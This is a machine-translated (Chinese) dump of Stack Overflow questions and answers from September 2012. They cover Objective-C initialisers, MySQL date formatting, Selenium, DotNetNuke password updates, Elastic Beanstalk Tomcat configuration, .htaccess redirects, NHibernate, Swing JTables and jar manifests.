Objective C 和 Java 之间有很大的不同。Java 是一种从头开始构建的解释性语言，而 Objective C 是建立在 C 语言之上的。你可以在 C 中做的任何事情在 Objective C 中也是有效的。

与 Java 不同，C（以及扩展的 Objective C）具有“原始内存分配”。在 Java 中，调用会`new` *自动*调用构造函数。该语言使绕过这种机制成为不可能。然而，在 Objective C 中，您可以分配原始内存。内存在返回给您时不包含随时可用的对象`alloc`- 它只是部分准备好使用。内存块有一个引用计数，它提供了足够的空间来容纳你的对象，但它还没有准备好接收你自己的子类已经实现的消息。这就是为什么您必须调用`init`（或使用`new`，它结合了`alloc`和`init`）。

`if (self = [super init])`分配/检查使您可以在对象的构造阶段捕获错误。如果您自己的初始化程序失败，您可以设置`self = nil`为向上报告问题。分配不同的对象要少得多，但也可以这样做。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-04T13:30:08.653

分配后实例变量应该被实例化。 `self = [super init]`指初始化超类init方法

一个常见的错误是写

`self = [[super alloc] init];` 它返回超类的实例，这不是您在子类构造函数/init 中想要的。你得到一个不响应子类方法的对象，这可能会令人困惑，并会产生关于不响应方法或未找到标识符等的令人困惑的错误。

`self = [super init]` 如果超类有成员（变量或其他对象）在设置子类的成员之前首先初始化，则需要。否则，objc 运行时会将它们全部初始化为 0 或 nil。（不像 ANSI C，它经常分配内存块而不清除它们）

是的，基类初始化可能会由于内存不足错误、缺少组件、资源获取失败等而失败，因此检查 nil 是明智的，并且只需不到几毫秒。

# mysql - 用于插入的 Date(Now()) 的等效日期时间

> ID：12264417
> 
> 赞同：1
> 
> 时间：2012-09-04T13:22:44.927
> 
> 标签：mysql

有没有办法在“文本”类型的列中以日期时间格式插入 NOW() - “YYYY-MM-DD HH:MM:SS”。

目前我正在使用：

```
INSERT INTO table (mycol) VALUES (DATE(NOW())) 
```

但这会以“YYYY-MM-DD”格式插入日期。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:24:22.507

只是`NOW()`会给你这个结果，因为你不会`DATE`先投。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-04T13:27:24.860

使用**[DATE_FORMAT()](http://davidwalsh.name/format-date-mysql-date_format)**

像这样的东西，

```
INSERT INTO tablename (sample) VALUES (DATE_FORMAT(NOW(), '%Y-%m-%d %H:%i:%S')) 
```

或简单

```
insert into tablename values(now()); 
```

# [*SQLFIDDLE 演示*](http://sqlfiddle.com/#!2/10b03/1)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T13:24:55.100

尝试使用[DATE_FORMAT(date,format)](http://www.w3schools.com/sql/func_date_format.asp)

```
DATE_FORMAT(NOW(),'%Y-%m-%d %h:%i %p') 
```

# android - 在 Facebook 上分享 Google Play 链接和错误的缩略图

> ID：12264418
> 
> 赞同：3
> 
> 时间：2012-09-04T13:22:49.073
> 
> 标签：android, facebook

当我尝试在我的 android facebook 应用上发布链接时，缩略图是错误的。这是网站上的随机图片。我有：

```
Intent intent = new Intent(Intent.ACTION_SEND);
intent.setType("text/plain");
intent.putExtra(Intent.EXTRA_TEXT, "my google play link");
startActivity(Intent.createChooser(intent, "Share with")); 
```

我该如何解决？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-04T21:00:30.063

您无法解决这个问题，Google 的 Play 商店在其网页上没有[og 元数据标签](https://developers.facebook.com/docs/opengraphprotocol/)来指定在 Facebook 上共享时要使用的图像。因此，Facebook 将只选择一个在作曲家中显示，而您无能为力来改变它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-08-14T21:13:39.070

使用 Facebook 的此调试器来管理要显示的图像：[https ://developers.facebook.com/tools/debug/sharing](https://developers.facebook.com/tools/debug/sharing)

从 Google Play 中删除所有图片。然后添加您想要显示的图像，包括“平板电脑”。然后在 FB 调试器中使用“Scrap Again”。

这有点随机，但通过一些实验你可以得到你想要的。

# file-upload - 在谷歌应用脚 本上传文件

> ID：12264423
> 
> 赞同：0
> 
> 时间：2012-09-04T13:22:58.093
> 
> 标签：file-upload, google-apps-script

我想将文件上传添加到我的 Google Apps 脚本应用程序。在我的服务器处理程序中，我只是这样调用我的函数：

```
 function serverHandler(params){
      uploadFile(params);
    .... 
```

函数如下所示：

```
 function uploadFile(e){ 
      var fileBlob = e.parameter.upload;
      var adoc = DocsList.createFile(fileBlob);
      return adoc.getUrl();
    } 
```

我总是收到错误：“遇到错误：方法 createFile（未找到，我不知道如何解决它。感谢您的帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T16:18:52.960

您不能使用服务器处理程序上传文件。您必须从表单提交按钮进行 POST。

[请参阅FileUpload 小部件文档](https://developers.google.com/apps-script/class_fileupload)中的漂亮示例代码

# javascript - 多浏览器的 Selenium - 需要可以执行 javascript 的 webDriver

> ID：12264424
> 
> 赞同：2
> 
> 时间：2012-09-04T13:22:59.917
> 
> 标签：javascript, selenium, webdriver, selenium-webdriver

我正在帮助构建一个自动化框架来测试我们的网站。由于测试用例必须针对 Chrome、Firefox 和 IE 运行，我们目前正在为我们的驱动程序传递一个 WebDriver 对象。这个对象实际上是 ChromeDriver、FirefoxDriver 或 InternetExplorerDriver，视情况而定。

我遇到的问题是我想让这个驱动程序打开一个新窗口以验证测试。我发现的唯一方法是执行 javascript - 请参见[此处](https://sqa.stackexchange.com/questions/2701/webdriver-navigate-to-new-browser-window)。

为了执行 javascript，驱动程序必须实现 JavascriptExecutor 接口。我们将使用的所有驱动程序实际上都是 JavascriptExecutors，但由于我们使用的是 WebDriver 接口，因此不能保证这一点。我试图让 javascript 运行，至少作为概念证明，但我也想知道如何正确组织我们的驱动程序对象，以便它可以执行 javascript，而不必明确说明它是三个驱动程序中的哪一个。

这是我试图测试打开新窗口的javascript方法的一些东西。它不起作用：

```
 if (ChromeDriver.class.isInstance(driver)) {
            ChromeDriver chrome = (ChromeDriver)driver;
            chrome.executeScript("window.open()");
        }
    for (String handle : driver.getWindowHandles()) {
            System.out.println(handle);
        } 
```

在上述情况下，我使用 Chrome 进行测试，因此我知道驱动程序实际上是 ChromeDriver。我猜测代码无法打开新窗口，因为我正在实例化一个新的驱动程序对象，并且我认为这不适用于 Selenium。如果它有效，我会继续尝试识别窗口（使用 driver.getWindowHandles）并在新窗口中加载 URL。

那么 - 代码无法打开一个新窗口的原因是我正在创建/投射一个 Selenium 不喜欢的新驱动程序对象吗？如果是这样，正确的解决方案是什么？我是否需要在 Chrome、Firefox 和 IE 驱动程序和 JavascriptExecutor 接口之间创建一个新接口——像这样？

```
 public interface SpecialDriver extends WebDriver, JavascriptExecutor {

     } 
```

这似乎不起作用 - 至少，我不能将 ChromeDriver 分配给 SpecialDriver，因为 ChromeDriver 没有显式实现我的新组合接口，即使它同时实现了 WebDriver 和 JavascriptExecutor。我用这种方法完全吠错了树吗？提前致谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-04T13:34:10.277

正确的方法是执行以下操作：

```
// WARNING! Untested code. Not guaranteed
// to work or even compile.
// Assume driver is a valid WebDriver object
// TODO: Wrap in try-catch to handle invalid 
// cast exception
 ((JavascriptExecutor)driver).executeScript("return 'your script goes here';"); 
```

虽然您是正确的，不能保证 WebDriver 对象也会实现 JavascriptExecutor，但现实情况是所有当前的实现都这样做。

# dotnetnuke - DotNetNuke：使用自定义模块更新 DNN 数据库中的用户密码

> ID：12264429
> 
> 赞同：2
> 
> 时间：2012-09-04T13:23:04.893
> 
> 标签：dotnetnuke

我对 DotNetNuke 很陌生，但我正在创建一个自定义模块，用户可以在其中更新他们的详细信息，然后将其保存。其中之一是密码。我不知道将某些内容插入 DotNetNuke 数据库或密码存储在哪个表中的最佳方法。有人可以帮我吗？

谢谢

编辑：我注意到 UserController 类下有一个“ChangePassword”函数，听起来好像可以解决问题，但是它要求我不知道如何获取用户的旧密码

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-03-22T16:42:37.457

您不需要知道旧密码，使用

```
MembershipProvider.Instance().ResetAndChangePassword(user, "password"); 
```

其中 user 是用户的 UserInfo 类型对象，“password”是带有新密码的字符串。它适用于 dnn 7。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-04T17:29:00.193

我已使用以下代码成功获取和更新用户密码。

```
strUsername = Entities.Users.UserController.GetCurrentUserInfo.Username    
strPassword = Membership.Provider.GetPassword(strUsername, String.Empty)
Membership.Provider.ChangePassword(strUsername, strPassword, txtPassword.Text) 
```

# java - 如何为弹性 beantalk tomcat 提供配置

> ID：12264432
> 
> 赞同：13
> 
> 时间：2012-09-04T13:23:05.427
> 
> 标签：java, tomcat, amazon-elastic-beanstalk

在本地部署到 tomcat 时，我对 server.xml 进行了此更改（如下），有没有办法可以将其提供给 Elastic Beanstalk？

```
<Connector connectionTimeout="20000" port="8080" 
       protocol="org.apache.coyote.http11.Http11NioProtocol" 
       redirectPort="8443"/>' 
```

谢谢 '

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2013-01-23T16:08:21.873

您现在可以在不提供自定义 AMI 的情况下执行此操作。按照以下说明操作： http: [//aws.typepad.com/aws/2012/10/customize-elastic-beanstalk-using-configuration-files.html](http://aws.typepad.com/aws/2012/10/customize-elastic-beanstalk-using-configuration-files.html)

为了在 webapp 中提供自定义服务器 xml 创建 .ebextensions 文件夹，放置自定义**server.xml**文件并再添加一个文件：**server-update.config**，内容为：

```
container_commands:
  replace-config:
  command: cp .ebextensions/server.xml /etc/tomcat7/server.xml 
```

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2015-06-02T14:05:17.553

在不替换整个 Tomcat`server.xml`文件的情况下实现此目的的另一种方法是在您的文件夹中使用以下内容`.ebextensions`（例如`tomcat.config`）

```
files:
  "/tmp/update_tomcat_server_xml.sh":
    owner: root
    group: root
    mode: "000755"
    content: |
      #! /bin/bash
      CONFIGURED=`grep -c '<Connector port="8080" URIEncoding="UTF-8"' /etc/tomcat7/server.xml`
      if [ $CONFIGURED = 0 ]
        then
          sed -i 's/Connector port="8080"/Connector port="8080" URIEncoding="UTF-8"/' /etc/tomcat7/server.xml
          logger -t tomcat_conf "/etc/tomcat7/server.xml updated successfully"
          exit 0
        else
          logger -t tomcat_conf "/etc/tomcat7/server.xml already updated"
          exit 0
      fi

container_commands:
  00_update_tomcat_server_xml:
    command: sh /tmp/update_tomcat_server_xml.sh 
```

此配置创建一个脚本 ( `files`)，然后运行它 ( `container_command`)。该脚本检查`server.xml`字符串`UIREncoding="UTF8"`，如果找不到，则使用`sed`命令将其添加。

这个解决方案的好处是，如果您升级 Tomcat 的版本（例如从 7 到 8），那么您不必担心更新`server.xml`各种 WAR 文件。

此外，此示例用于添加`UIREncoding`参数，但脚本很容易适应添加`<Connector ... />'`原始问题的属性。

# php - 我应该在 phpunit 中测试什么？

> ID：12264434
> 
> 赞同：7
> 
> 时间：2012-09-04T13:23:17.450
> 
> 标签：php, unit-testing

我不知道这是否是一个过于本地化的问题，但我不知道我应该使用 PHPUnit 进行单元测试。例如在一个简单的用户注册/登录系统上，我应该测试什么？

我希望你明白我的意思并启发我。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-04T13:25:22.960

PHPUnit 是一个*单元测试*套件，因此得名。根据定义，单元测试是为每个*单元*编写测试——即每个类、每个方法——尽可能与系统的每个其他部分分开。用户可以使用的每一件事，你都想尝试测试它——除了其他所有东西之外，*只有它——按照指定的方式运行。*

基本上，您想要测试每个可能失败的公共（可能是受保护的）方法。如果你内心的黑客想知道“嗯......如果我这样调用这个函数*，*它会破坏吗？”，然后编写一个断言它不会破坏的测试。请注意隔离正在测试的组件；否则，您只会有一堆失败的测试，但不会为您提供真正问题所在的线索。

# openlayers - 如何在openlayers中的绘制线串上显示点

> ID：12264435
> 
> 赞同：0
> 
> 时间：2012-09-04T13:23:18.590
> 
> 标签：openlayers

我在一个简单的地图上使用 OpenLayers 的编辑工具栏。到目前为止一切正常，我可以绘制点、线和多边形。

通过在给定地图上绘制一个简单的线串，我得到以下结果：

[OpenLayers 示例 1](http://www.imagebanana.com/view/j4jzbhw7/Selection_001.png)

我真正想要的是，OpenLayers 会自动将点添加到线串中，如下所示：

[OpenLayers 示例 2](http://www.imagebanana.com/view/0d0x9ip6/Selection_002.png)

那可能吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-05T08:37:26.707

您需要一个在绘图结束时触发的函数 函数将遍历新创建的线的每个顶点并创建一个点（我建议在新层中）。你想把它保存在某个地方吗？

```
map.layers[1].events.register('sketchcomplete', this, extractVertex);

//f is an object sketched
function extractVertex(f) {

    var arrayOfPointsInWKT = [];
    var vert = f.feature.geometry.getVertices();
    for(var i = 0; i < vert.length; i++) {
        arrayOfPointsInWKT.push(vert[i].toString());
    }

    //ajax call to the script that will save a table it in the database

} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-04T14:26:47.023

您应该查看可以在[此处](http://docs.openlayers.org/library/feature_styling.html)找到的功能样式文档（StyleMaps、基于规则的样式等） 。它会给你你所需要的。

**编辑**

正如我回忆的那样，点是 LineStrings 的一部分，看来我错了......我现在看到它是您正在寻找的点，而不是它们的样式。对不起，放错了答案。

我在 GIS 网站上发现了一个看起来可以使用的帖子。祝你好运！

[https://gis.stackexchange.com/questions/28242/show-a-collection-of-linestrings-with-labels](https://gis.stackexchange.com/questions/28242/show-a-collection-of-linestrings-with-labels)

# wordpress - 在 htaccess 中使用 mod_rewrite 重定向 URL 查询（获取参数，如 ?id=5）

> ID：12264436
> 
> 赞同：0
> 
> 时间：2012-09-04T13:23:19.900
> 
> 标签：wordpress, apache, .htaccess, mod-rewrite, redirect

我现在的`htaccess`样子

```
DirectoryIndex welcome.do index.jsp default.php index.wml homepage.php default.htm default.html index.php index.php4 index.php3 index.htm index.html index.shtml default_new_vhost.html

# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>

# END WordPress

RedirectPermanent /content.asp?AUID=01 /content/
... 
```

重定向不起作用（我只得到了 Wordpress 的 404 页）。原因是 URL 中的 get 参数。我尝试了[此处](https://stackoverflow.com/questions/1260632/apache-redirect-301-fails-when-using-get-parameters-such-as-blah)发布的答案。例如

```
RewriteCond %{REQUEST_URI} ^/content.asp$
RewriteCond %{QUERY_STRING} ^AUID=01$
RewriteRule ^.*$ http://www.yourdomain.com/content? [L,R=301] 
```

要么我收到 500 错误，要么我来到 Wordpress 的 404 页面。这样做的正确方法是什么？比我在表格中有很多条目

```
RedirectPermanent /content.asp?pCategory=&pCountry=1&AUID=01 /content/ 
```

这是错误的，但我寻找一种有效的方法将其放入 htaccess 中。我可以改用这样的东西吗？

```
RewriteCond %{REQUEST_URI} ^/content.asp$
RewriteCond %{QUERY_STRING} ^pCategory=([0-9]+)&pCountry=([0-6]+)$
RewriteRule ^.*$ http://www.yourdomain.com/content? [L,R=301] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-05T08:37:00.730

我最终得到了以下解决方案：

```
DirecotryIndex welcome.do index.jsp ...

RewriteCond %{REQUEST_URI} ^/content.asp$
RewriteCond %{QUERY_STRING} ^AUID=01$ [OR]
RewriteCond %{QUERY_STRING} ^pCategory=&pCountry=1&AUID=01$ [OR]
RewriteCond %{QUERY_STRING} ^pCategory=&pCountry=8&AUID=01$
RewriteRule ^.*$ /content? [L,R=301]

RedirectPermanent /italiano/index.asp /it/

# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>

# END WordPress 
```

问题是我把我的代码放在了 Wordpress 代码之后而不是之前。如果您将 htaccess 的编码更改为没有 BOM 的 UTF-8，也可以使用变音符号。您还可以毫无问题地重定向到带有 GET 参数的 URL。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T19:50:00.550

你只需这样做（来自我的网站）

```
rewriteCond %{QUERY_STRING} ^id=([0-9]+)$
rewriterule ^news_details.asp$ news/index.php?old_id=%1 
```

将 ^id 替换为任何参数，只需用户 %1, %2 在重写中访问它们，您的将是

```
rewriteCond %{QUERY_STRING} ^pCategory=([0-9]+)&pCountry=([0-6]+)$
rewriteRule ^content.asp$ /content/?category=%1&country=%2 
```

# objective-c - 在segue之前和之后隐藏NavigationBar

> ID：12264439
> 
> 赞同：3
> 
> 时间：2012-09-04T13:23:36.797
> 
> 标签：objective-c, swift, ios5, uinavigationbar, uistoryboard

我有一个应用程序，其中 TableView 控制器连接到 ViewController，然后连接到另一个。

我想最大化 TVC 中的空间并使用

```
[self.navigationController setNavigationBarHidden: YES animated:YES]; 
```

隐藏栏。然而，从segue返回的酒吧返回视图。

该应用程序是在 Storyboard 中使用 Xcode 4.3.1 构建的 5.1。

任何人都可以通过告诉我在哪里可以放置类似的指令以在从 segue 返回时删除导航栏或建议一种替代方法来提供帮助。

通过更改所涉及控制器的属性，我已经用尽了情节提要中的所有方法。然而，你在 Storyboard 中看到的并不总是我得到的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-07-31T20:27:21.550

我在评论中找到了上面的答案，所以只是记录它，因为我使用它并且效果很好！感谢@Tomasz。

为了防止导航栏在您返回 segue 后重新出现在标题中，请使用以下命令：

```
-(void)viewWillAppear:(BOOL)animated
{
    [self.navigationController setNavigationBarHidden: YES animated:YES];
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-05-12T12:38:05.903

## 迅捷解决方案

```
override func viewWillAppear(animated: Bool) {
    self.navigationController?.setNavigationBarHidden(true, animated: true)
} 
```

感谢@spacemonkey 和@Tomasz，这行得通。

# wordpress - 小部件逻辑多个选项不起作用

> ID：12264450
> 
> 赞同：1
> 
> 时间：2012-09-04T13:24:09.260
> 
> 标签：wordpress, widget

我现在在我的 wordpress 主题中使用小部件逻辑插件。我想在不同的小部件中使用一个小部件。例如，我不想在主页和“关于”内页中使用小部件。所以我写了以下内容来禁用这些页面中的小部件。

```
!is_front_page() || !is_page('about') 
```

但我无法通过代码得到结果。我的代码是否有任何问题，或者是否有任何其他方法可以在特定页面中获取小部件。

小部件是否使用小部件逻辑代码启用。请帮助我得到结果。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:26:34.207

是的，不应该是`||`应该的`&&`——你所做的总是会被认为是真的。

# visual-studio-2010 - 使用 VS2010 和 SQL2012 为 SQL2008 创建 SSIS

> ID：12264460
> 
> 赞同：1
> 
> 时间：2012-09-04T13:24:57.623
> 
> 标签：visual-studio-2010, sql-server-2008, ssis, sql-server-2012

> **可能重复：**
> [是否可以在 SQL Server 2008 上部署 SSIS 2012 包](https://stackoverflow.com/questions/10499290/is-it-possible-to-deploy-ssis-2012-package-on-sql-server-2008)

目前我的电脑上有 Visual Studio 2010 和 SQL Server 2012。现在我想创建一个 SSIS 包，它应该在 SQL Server 2008 上运行。

如果我正常创建它，如果我尝试在服务器上加载它，我只会收到以下错误：

> 由于错误 0xc0010014 "[...]" 导致包加载失败 当 CPackage::LoadFromXML 失败时会发生这种情况。

如果我尝试使用 BIS 2008 打开它，则会收到类似的错误。

有什么方法可以更改我的 dtsx 以便它可以在 SQL Server 2008 上运行？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-04T17:07:12.530

你不能。自 2008 年以来，包发生了变化：XML 结构不一样。为 SQL Server 2012 创建的包将仅针对该技术运行。要拥有 2008 包，请使用 BIDS 2008 创建它。

# linq - NHibernate 3.3 Linq 使用位参数和位结果调用用户定义函数

> ID：12264461
> 
> 赞同：1
> 
> 时间：2012-09-04T13:24:58.027
> 
> 标签：linq, nhibernate

我正在扩展 NHibernate Linq 提供程序，并且我希望调用具有位参数 [s] 和返回类型的用户定义。

这是 SQL 用户定义的函数签名：

```
 FUNCTION f_DocumentsFreeTextSearch
 (
     @docId int,
     @searchString varchar(8000),
     @searchTitle bit
 )
 RETURNS bit 
```

这是用于 Linq 使用的“假”扩展方法：

```
public static class DialectExtensions
{
    public static bool FreeText(this Document doc, string searchString, bool searchTitle)
    {
        return false;
    }
} 
```

这是我的 LinqToHqlGeneratorsRegistry

```
public sealed class ExtendedLinqToHqlGeneratorsRegistry : DefaultLinqToHqlGeneratorsRegistry
{
    public ExtendedLinqToHqlGeneratorsRegistry()
    {
            DialectExtensions.FreeText(null, null, true)),
            new FreeTextGenerator());
    }
} 
```

这是我的生成器：

```
public class FreeTextGenerator : BaseHqlGeneratorForMethod
{
    public FreeTextGenerator()
    {
        SupportedMethods = new[]
                               {
                                   ReflectionHelper.GetMethodDefinition(() => DialectExtensions.FreeText(null, null, true))
                               };
    }

    #region Overrides of BaseHqlGeneratorForMethod

    public override HqlTreeNode BuildHql(MethodInfo method, Expression targetObject, ReadOnlyCollection<Expression> arguments, HqlTreeBuilder treeBuilder, IHqlExpressionVisitor visitor)
    {
        return treeBuilder.MethodCall("dbo.f_documentsfreetextsearch", arguments.Select(a => visitor.Visit(a).AsExpression()).ToArray());
    }

    #endregion
} 
```

这是所需的用法：

```
 [TestMethod]
    public void CanFreeText()
    {
        var query = SessionHolder.Current.Query<Document>();
        var list = query.Where(d => d.FreeText("giorno", true)).ToList();            
    } 
```

第一个问题：上面的代码导致了 InvalidCastException：

> 测试方法 App.Tests.NHMapping.CanFreeText 抛出异常：System.InvalidCastException：无法将“NHibernate.Hql.Ast.HqlMethodCall”类型的对象转换为“NHibernate.Hql.Ast.HqlBooleanExpression”类型。

以这种方式解决（不优雅但有效）：

```
 [TestMethod]
    public void CanFreeText()
    {
        var query = SessionHolder.Current.Query<Document>();
        var list = query.Where(d => d.FreeText("giorno", true) == true).ToList();            
    } 
```

现在NHibernate执行查询，但是生成的SQL是错误的：

> 测试方法 App.Tests.NHMapping.CanFreeText 抛出异常：NHibernate.Exceptions.GenericADOException: could not execute query [ select [...] from dbo.DOCUMENTS document0_ where case when dbo.f_documentsfreetextsearch(document0_.IDDOCUMENT, @p0, @p1 =1) then 1 else 0 end=@p2 ] Name:p1 - Value:giorno Name:p2 - Value:True Name:p3 - Value:True [SQL: select [...] from dbo.DOCUMENTS document0_ where case when dbo.f_documentsfreetextsearch(document0_.IDDOCUMENT, @p0, @p1=1) then 1 else 0 end=@p2] ---> System.Data.SqlClient.SqlException: '=' 附近的语法不正确。

请注意，生成的 SQL 中的函数调用将 @p1=1 作为第三个参数，并且 WHERE 子句是内联 CASE 而不是

> dbo.f_documentsfreetextsearch(document0_.IDDOCUMENT, @p0, @p1) = 1

正如我所料。

如果我在我的 C# 代码中将 bool 参数和返回类型更改为 Int32，则一切正常（但仍然不是很优雅）。

知道如何使所需的语法起作用吗？

提前致谢

克劳迪奥

PS：抱歉有很多代码和错误的文字：P

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-05T18:33:22.800

似乎您遇到了与我在使用用户类型作为布尔属性时相同的[错误 NH-2839 。](https://nhibernate.jira.com/browse/NH-2839?page=com.atlassian.streams.streams-jira-plugin%3aactivity-stream-issue-tab)在解决此问题之前，您现在无能为力。

# c# - 根据调整大小的容器调整文本大小

> ID：12264466
> 
> 赞同：0
> 
> 时间：2012-09-04T13:25:19.933
> 
> 标签：c#, wpf, wpf-controls, visual-studio-2012

假设我在 UI 中有一个可调整大小的部分，它是标准的 WPF 容器控件（在本例中为 Canvas），并且我在此 Canvas 上放置了一些文本。如何根据 Canvas 的渲染大小重新调整文本大小？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:46:29.583

Viewbox 将拉伸一个 TextBlock

[如何：将拉伸属性应用于视图框的内容](http://msdn.microsoft.com/en-us/library/ms752301%28v=vs.100%29)

```
<Viewbox Grid.Row="1" Grid.Column="1" Name="vb1" Stretch="Fill" >
    <TextBlock Text="tulip_farm.jpg"/>
</Viewbox> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T13:36:15.447

您可以简单地将一个方法链接到容器调整大小事件，这也将调整文本大小（这样它们始终保持同步），我会提供一个示例，但由于您没有发布示例，我认为您理解我的意思.

# php - 调用对象的get_方法

> ID：12264467
> 
> 赞同：0
> 
> 时间：2012-09-04T13:25:20.387
> 
> 标签：php, class, object, reflection, constructor

我有

```
foreach ($constructor_param_names as $reflectionParameter ){
            $constructor_params[] = $reflectionParameter -> getName();
            $property = $reflectionParameter -> getName();

//how to call the get____ method of the object
//to get the param value (of that parameter name)
            $value = $reflectionParameter-> ...
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:29:43.537

这在[变量方法](http://php.net/manual/en/functions.variable-functions.php)的文档中进行了解释。

对于实例方法：

```
$methodName = 'get_'.$property;
$value = $object->$methodName(); 
```

还有其他调用 getter 的方法（例如`call_user_func`and `ReflectionMethod::invoke`），但这是最直接的。

另请注意，PHP 中的函数和方法名称*不区分大小写*，因此无需注意大小写。

# java - 通过单击按钮创建新的 JTable？

> ID：12264475
> 
> 赞同：4
> 
> 时间：2012-09-04T13:25:38.387
> 
> 标签：java, swing, jtable

我想问一下`JTable`按钮点击（`actionPerformed`）时如何制作新的s？我想以`JTable`这种方式添加几个 s 。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-04T13:35:17.193

*   对[JTable](http://docs.oracle.com/javase/tutorial/uiswing/components/table.html)使用[DefaultTableModel](http://docs.oracle.com/javase/tutorial/uiswing/components/table.html#data)

*   那么没有理由`recreate`或`remove then add` [JComponents](http://docs.oracle.com/javase/tutorial/uiswing/components/index.html)

*   所有更新都`JTable`必须`Model`在 [事件调度线程上完成](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/index.html)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-04T13:29:49.340

这是如何创建一个的方法，自己弄清楚如何添加更多，因为您没有提供任何[SSCCE](http://sscce.org)：

编辑：

```
import java.awt.*;
import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.*;

public class Stack extends JFrame implements ActionListener{
    JTable table;
    JPanel panel = new JPanel();
    JButton button = new JButton("Add");

    String data[][]={{"hey","hey"},{"hey","hey"},{"hey","hey"},{"hey","hey"},    {"hey","hey"},{"hey","hey"}
,{"hey","hey"},{"hey","hey"},{"hey","hey"},{"hey","hey"},{"hey","hey"},{"hey","hey"},{"hey","hey"},{"hey","hey"}
,{"hey","hey"},{"hey","hey"}};
    String columns[] = {"First","Second"};

    public Stack(){
        setLayout(new BorderLayout());
        panel.setLayout(new BoxLayout(panel, BoxLayout.PAGE_AXIS));
        panel.setPreferredSize(new Dimension(1024,768));
        button.addActionListener(this);
        add(panel,BorderLayout.CENTER);
        add(button, BorderLayout.SOUTH);

    }

    public static void main(String [] a){
        Stack s = new Stack();
        s.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        s.pack();
        s.setVisible(true);
    }

    @Override
    public void actionPerformed(ActionEvent arg0) {
        //panel.removeAll();
        table =new JTable(data,columns);
        panel.add(new JScrollPane(table));
        repaint();
        revalidate();
    }
} 
```

# java - 带有清单文件的 Jar 文件停止工作

> ID：12264491
> 
> 赞同：0
> 
> 时间：2012-09-04T13:26:39.570
> 
> 标签：java, jar, noclassdeffounderror

我在过去创建的 jar 文件 ( `xl-importer.jar`) 停止加载。该`MANIFEST.MF`文件如下：

```
Manifest-Version: 1.0
Created-By: 1.5.0 (Sun Microsystems Inc.)
Main-Class: class/Client 
```

尽管`Client`.jar 文件中的文件夹 /class/ 中有类，但我总是收到此错误：

`Exception in thread "main" java.lang.NoClassDefFoundError: class/Client (wrong name: Client)`

但是，当我`java Client`在 /class/ 文件夹中运行时，应用程序运行良好。

Jar 是几年前使用 32 位编译器创建的。我的客户前段时间迁移到 Windows 2003 Server。是这个原因吗？在此之前加载 Jar 文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:37:28.470

在[java 教程](http://docs.oracle.com/javase/tutorial/deployment/jar/appman.html)中，它指定 Main-Class 指定为：

> 主类：MyPackage.MyClass

因此，您可能需要将“/”替换为“。”

如果该类位于名为“class”的目录中，则需要将它们放入类包中。**“class”是java中的一个关键字，所以你不能用它作为包名。**如果您将文件夹名称更改为其他名称，例如“classes”，并在您的 java 文件中添加一个 package 语句，则使用“.”引用该类。而不是“/”它应该工作。无论如何，它与我的:) 例如

显现：

```
Manifest-Version: 1.0
Created-By: 1.5.0 (Sun Microsystems Inc.)
Main-Class: classes.Client 
```

客户端.java：

```
package classes;

public class Client{

//do code...

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T13:37:45.367

这就是较新的 Manifest 的样子（java 6）

```
Manifest-Version: 1.0
Created-By: 1.6.0 (Sun Microsystems Inc.)
Main-Class: MyPackage.MyClass 
```

我的猜测是 java 5 使用了不同的协议。

尝试更改主类，如上所示。

# android - 如何处理来自移动设备的视频方向

> ID：12264501
> 
> 赞同：4
> 
> 时间：2012-09-04T13:27:15.770
> 
> 标签：android, ios, video, orientation, video-processing

我有一个服务器组件，用于处理 web/iOS/Android 应用程序的视频上传。

但是，我在处理视频方向时遇到了问题。有没有解决这个问题的好方法？我有一个工具 MediaInfo 可以将元数据从设备中提取出来，但这就是我遇到的

iOS

*   肖像是正确的 90 或 270
*   风景很疯狂。如果您用左侧的按钮按住设备，它会报告前置摄像头为 0，后置摄像头为 180

安卓

*   这里情况相反，前后摄像头的风景都是正确的
*   肖像是 90 或 270，具体取决于您使用的是前置摄像头还是后置摄像头
*   此外，摩托罗拉 Droids 和 Evo4G 等一些设备根本不记录元数据

